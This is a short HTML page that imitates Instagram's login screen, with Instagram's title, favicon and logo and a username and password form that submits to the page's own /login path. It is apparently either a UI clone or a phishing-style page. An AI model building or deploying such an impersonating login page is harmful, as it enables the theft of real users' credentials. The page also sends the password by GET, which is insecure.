<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <title>Instagram</title>
    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
    <link href="./styles.css" rel="stylesheet">
</head>

<body>

    <div id="wrapper">
        <div class="main-content">
            <div class="header">
                <img src="https://i.imgur.com/zqpwkLQ.png" />
            </div>
            <div class="l-part">
                <form id="login-form" action="/login" method="GET">
                    <input type="text" name="username" placeholder="Username" class="input-1" required><br>
                    <input type="password" name="password" placeholder="Password" class="input-2" required><br>
                    <button type="submit" class="btn">Log In</button>
                </form>
            </div>
        </div>
        <div class="sub-content">
            <div class="s-part">
                Don't have an account? <a href="#"> Sign up</a>
            </div>
        </div>
    </div>
</body>

</html>
